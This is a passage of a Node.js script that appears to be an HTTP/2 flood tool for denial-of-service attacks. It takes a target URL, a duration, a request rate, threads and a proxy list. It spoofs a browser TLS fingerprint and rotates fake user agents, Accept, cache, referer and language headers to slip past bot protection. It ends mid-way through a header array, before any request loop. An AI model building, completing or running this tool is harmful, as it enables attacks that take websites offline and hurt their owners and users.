
process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
  })
process.on("SIGCHILD", () => {
    return 1;
  });

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var colors = require('colors');
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 7){
    console.log('node ' + file + ' <url> <time> <requests> <threads> <proxy> ( options: <cookie> )'.rainbow); 
    process.exit();
}
const ua = require('user-agents');
const { type } = require("os");

const deviceRatios = {
    desktop:64,   
        mobile: 32,    
            tablet: 32     
              };
                
                  let randomDeviceCategory;
                    const randomValue = Math.floor(Math.random() * 10);
                      if (randomValue < deviceRatios.desktop) {
                          randomDeviceCategory = 'desktop';
                            } else if (randomValue < deviceRatios.desktop + deviceRatios.mobile) {
                                randomDeviceCategory = 'mobile';
                                  } else {
                                      randomDeviceCategory = 'tablet';
                                        }
                                          
                                            const userAgent = new ua({
                                                deviceCategory: randomDeviceCategory
                                                  }).toString();
                                                    var newua = userAgent;

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512"; "ecdsa_brainpoolP384r1tls13_sha384";"ecdsa_brainpoolP512r1tls13_sha512";"ecdsa_sha1";"rsa_pss_pss_sha384";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}
 
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
 }

 accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/plain, */*; q=0.01',
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
                      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
    
]

 uas = [
        "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
            "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
                "portalmmm/2.0 N410i(c20;TB) ",
                    "Python-urllib/2.5",
                        "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
                            "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
                                    "SearchExpress",
                                        "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
                                            "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
                                                "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                    "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
                                                        "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                            "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                                                    "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                        "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                            "SonyEricssonT100/R101",
                                                                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
                                                                                    "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
                                                                                        "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
                                                                                            "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
                                                                                                "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
                                                                                                    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
                                                                                                        "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
                                                                                                            "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
                                                                                                                "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                                                                    "SonyEricssonT68/R201A",
                                                                                                                        "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                                                                            "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                                                                                                                "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
                                                                                                                                    "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
                                                                                                                                        "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
                                                                                                                                            "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
                                                                                                                                                "HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)",
                                                                                                                                                    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
                                                                                                                                                        "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
                                                                                                                                                            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
                                                                                                                                                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
                                                                                                                                                                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
                                                                                                                                                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70',
                                                                                                                                                                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
                                                                                                                                                                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                                                                                                                                                                                    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
                                                                                                                                                                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
                                                                                                                                                                                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                                                                                                                                                                                                'Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28',
                                                                                                                                                                                                  
                                                                                                                                                                                                      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                                                                                                                                                                                          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                                                                                                                                                                                                              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                                                                                                                                                                                                                  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                                                                                                                                                                                                                      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                                                                                                                                                                                          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                                                                                                                                                                                                                              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                          'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                                                                                                                                                                                                                                              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                          'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
                                                                                                                                                                                                                                                            ];

cache_header = [
    'max-age=0',
    'must-revalidate',
    'public',
   'no-transform',
    'no-cache',
    's-maxage=86400',
    'only-if-cached',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
],
referer = [
      'https://www.google.com',
        'https://www.facebook.com',
          'https://www.twitter.com',
            'https://anotepad.com/',
              'https://www.amazon.ca/',
                'https://www.youtube.com',
                  'https://m.apkpure.com/vn/',
                    'https://www.amazon.com',
                      'https://books.google.com/',
                        'https://www.amazon.ca/',
                          'https://www.instagram.com',
                            'https://www.yahoo.com',
                              'https://www.stackoverflow.com',
                                'https://www.github.com',
                                  'https://www.linkedin.com',
                                    'https://www.cnn.com',
                                      'https://www.apple.com',
                                        'https://developer.paypal.com/home',
                                          'https://www.microsoft.com',
                                            'https://www.wikipedia.org',
                                              'https://www.nytimes.com',
                                                'https://www.msn.com',
                                                  'https://www.reddit.com',
                                                    'https://www.quora.com',
                                                      'https://www.npr.org',
                                                        'https://www.bbc.com',
                                                          'https://blog.twitter.com/',
                                                            'https://www.theguardian.com',
                                                              'https://www.huffingtonpost.com',
                                                                'https://www.washingtonpost.com',
                                                                  'https://www.wsj.com',
                                                                    'https://www.bloomberg.com',
                                                                      'https://www.cnbc.com',
                                                                        'https://www.merriam-webster.com',
                                                                          'https://www.dictionary.com',
                                                                            'https://www.thedailybeast.com',
                                                                              'https://www.thedailyshow.com',
                                                                                'https://www.colbertnation.com',
                                                                                  'https://www.nationalgeographic.com',
                                                                                    'https://www.nasa.gov',
                                                                                      'https://www.nypl.org',
                                                                                        'https://www.britannica.com',
                                                                                          'https://www.healthline.com',
                                                                                            'https://www.webmd.com',
                                                                                              'https://www.mayoclinic.org',
                                                                                                'https://www.cdc.gov',
                                                                                                  'https://www.nih.gov',
                                                                                                    'https://www.medlineplus.gov',
                                                                                                      'https://www.cancer.gov',
                                                                                                        'https://www.fda.gov',
                                                                                                          'https://www.nature.com',
                                                                                                            'https://www.sciencemag.org',
                                                                                                              'https://www.scientificamerican.com',
                                                                                                                'https://www.who.int',
                                                                                                                  'https://www.un.org',
                                                                                                                    'https://www.worldbank.org',
                                                                                                                      'https://www.imf.org',
                                                                                                                        'https://www.wto.org',
                                                                                                                          'https://www.oecd.org',
                                                                                                                            'https://www.europa.eu',
                                                                                                                              'https://www.nato.int',
                                                                                                                                'https://www.icrc.org',
                                                                                                                                  'https://www.amnesty.org',
                                                                                                                                    'https://www.hrw.org',
                                                                                                                                      'https://www.greenpeace.org',
                                                                                                                                        'https://www.oxfam.org',
                                                                                                                                          'https://www.doctorswithoutborders.org',
                                                                                                                                            'https://www.unicef.org',
                                                                                                                                              'https://www.savethechildren.org',
                                                                                                                                                'https://www.redcross.org',
                                                                                                                                                  'https://www.wikipedia.org',
                                                                                                                                                    'https://www.wikimedia.org',
                                                                                                                                                      'https://www.mozilla.org',
                                                                                                                                                        'https://www.apache.org',
                                                                                                                                                          'https://www.mysql.com',
                                                                                                                                                            'https://www.php.net',
                                                                                                                                                              'https://www.python.org',
                                                                                                                                                                'https://www.ruby-lang.org',
                                                                                                                                                                  'https://www.jquery.com',
                                                                                                                                                                    'https://www.reactjs.org',
                                                                                                                                                                      'https://www.angularjs.org',
                                                                                                                                                                        'https://www.vuejs.org',
                                                                                                                                                                          'https://www.bootstrap.com',
                                                                                                                                                                            'https://www.materializecss.com',
                                                                                                                                                                              'https://www.sass-lang.com',
                                                                                                                                                                                'https://www.lesscss.org',
                                                                                                                                                                                  'https://www.d3js.org',
                                                                                                                                                                                    'https://www.highcharts.com',
                                                                                                                                                                                      'https://www.chartjs.org',
                                                                                                                                                                                        'https://www.mapbox.com',
                                                                                                                                                                                          'https://www.mapboxgl-js.com',
                                                                                                                                                                                            'https://www.openstreetmap.org',
                                                                                                                                                                                              'https://www.mapbox.com',
                                                                                                                                                                                                'https://www.mapboxgl-js.com',
                                                                                                                                                                                                  'https://www.chartjs.org',
                                                                                                                                                                                                    'https://www.highcharts.com',
                                                                                                                                                                                                      'https://www.d3js.org',
                                                                                                                                                                                                        'https://www.lesscss.org',
                                                                                                                                                                                                          'https://www.sass-lang.com',
                                                                                                                                                                                                            'https://www.materializecss.com',
                                                                                                                                                                                                              'https://www.bootstrap.com',
                                                                                                                                                                                                                'https://www.vuejs.org',
                                                                                                                                                                                                                  'https://www.angularjs.org',
                                                                                                                                                                                                                    'https://www.reactjs.org',
                                                                                                                                                                                                                      'https://www.jquery.com',
                                                                                                                                                                                                                        'https://www.ruby-lang.org',
                                                                                                                                                                                                                          'https://www.python.org',
                                                                                                                                                                                                                            'https://www.php.net',
                                                                                                                                                                                                                              'https://www.mysql.com',
                                                                                                                                                                                                                                'https://www.apache.org',
                                                                                                                                                                                                                                  'https://www.mozilla.org',
                                                                                                                                                                                                                                    'https://www.wikimedia.org',
                                                                                                                                                                                                                                      'https://www.wikipedia.org',
                                                                                                                                                                                                                                        'https://www.redcross.org',
                                                                                                                                                                                                                                          'https://www.savethechildren.org',
                                                                                                                                                                                                                                            'https://www.unicef.org',
                                                                                                                                                                                                                                              'https://www.doctorswithoutborders.org',
                                                                                                                                                                                                                                                'https://www.oxfam.org',
                                                                                                                                                                                                                                                  'https://www.greenpeace.org',
                                                                                                                                                                                                                                                    'https://www.hrw.org',
                                                                                                                                                                                                                                                      'https://www.amnesty.org',
                                                                                                                                                                                                                                                        'https://www.icrc.org',
                                                                                                                                                                                                                                                          'https://www.nato.int',
                                                                                                                                                                                                                                                            'https://www.europa.eu',
                                                                                                                                                                                                                                                              'https://www.oecd.org',
                                                                                                                                                                                                                                                                'https://www.wto.org',
                                                                                                                                                                                                                                                                  'https://www.imf.org',
                                                                                                                                                                                                                                                                    'https://www.worldbank.org',
                                                                                                                                                                                                                                                                      'https://www.un.org',
                                                                                                                                                                                                                                                                        'https://www.who.int',
                                                                                                                                                                                                                                                                          'https://www.scientificamerican.com',
                                                                                                                                                                                                                                                                            'https://www.sciencemag.org',
                                                                                                                                                                                                                                                                              'https://www.nature.com',
                                                                                                                                                                                                                                                                                'https://www.fda.gov',
                                                                                                                                                                                                                                                                                  'https://www.cancer.gov',
                                                                                                                                                                                                                                                                                    'https://www.medlineplus.gov',
                                                                                                                                                                                                                                                                                      'https://www.nih.gov',
                                                                                                                                                                                                                                                                                        'https://www.cdc.gov',
                                                                                                                                                                                                                                                                                          'https://www.mayoclinic.org',
                                                                                                                                                                                                                                                                                            'https://www.webmd.com',
                                                                                                                                                                                                                                                                                              'https://www.healthline.com',
                                                                                                                                                                                                                                                                                                'https://www.britannica.com',
                                                                                                                                                                                                                                                                                                  'https://www.nypl.org',
                                                                                                                                                                                                                                                                                                    'https://www.nasa.gov',
                                                                                                                                                                                                                                                                                                      'https://www.nationalgeographic.com',
                                                                                                                                                                                                                                                                                                        'https://www.colbertnation.com',
                                                                                                                                                                                                                                                                                                          'https://www.thedailyshow.com',
                                                                                                                                                                                                                                                                                                            'https://www.thedailybeast.com',
                                                                                                                                                                                                                                                                                                              'https://www.dictionary.com',
                                                                                                                                                                                                                                                                                                                'https://www.merriam-webster.com',
                                                                                                                                                                                                                                                                                                                  'https://www.cnbc.com',
                                                                                                                                                                                                                                                                                                                    'https://www.bloomberg.com',
                                                                                                                                                                                                                                                                                                                      'https://www.wsj.com',
                                                                                                                                                                                                                                                                                                                        'https://www.washingtonpost.com',
                                                                                                                                                                                                                                                                                                                          'https://www.huffingtonpost.com',
                                                                                                                                                                                                                                                                                                                            'https://www.theguardian.com',
                                                                                                                                                                                                                                                                                                                              'https://www.bbc.com',
                                                                                                                                                                                                                                                                                                                                'https://www.npr.org',
                                                                                                                                                                                                                                                                                                                                  'https://www.quora.com',
                                                                                                                                                                                                                                                                                                                                    'https://www.reddit.com',
                                                                                                                                                                                                                                                                                                                                      'https://www.msn.com',
                                                                                                                                                                                                                                                                                                                                        'https://www.nytimes.com',
                                                                                                                                                                                                                                                                                                                                          'https://www.wikipedia.org',
                                                                                                                                                                                                                                                                                                                                            'https://www.microsoft.com',
                                                                                                                                                                                                                                                                                                                                              'https://www.apple.com',
                                                                                                                                                                                                                                                                                                                                                'https://www.cnn.com',
                                                                                                                                                                                                                                                                                                                                                  'https://www.linkedin.com',
                                                                                                                                                                                                                                                                                                                                                    'https://www.github.com',
                                                                                                                                                                                                                                                                                                                                                      'https://www.stackoverflow.com',
                                                                                                                                                                                                                                                                                                                                                        'https://www.yahoo.com',
                                                                                                                                                                                                                                                                                                                                                          'https://www.instagram.com',
                                                                                                                                                                                                                                                                                                                                                            'https://www.netflix.com',
                                                                                                                                                                                                                                                                                                                                                              'https://www.amazon.com',
                                                                                                                                                                                                                                                                                                                                                                'https://ngrok.com',
                                                                                                                                                                                                                                                                                                                                                                  'https://www.youtube.com',
                                                                                                                                                                                                                                                                                                                                                                    'https://www.twitter.com',
                                                                                                                                                                                                                                                                                                                                                                      'https://www.facebook.com',
                                                                                                                                                                                                                                                                                                                                                                        'https://www.google.com',
                                                                                                                                                                                                                                                                                                                                                                        ];
language_header = [
    'ru-RU,ru;q=0.9',
    'ru-RU,ru;q=0.8',
    'ru-RU,ru;q=0.7',
    'ru-RU,ru;q=0.6',
    'ru-RU,ru;q=0.5',
    'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
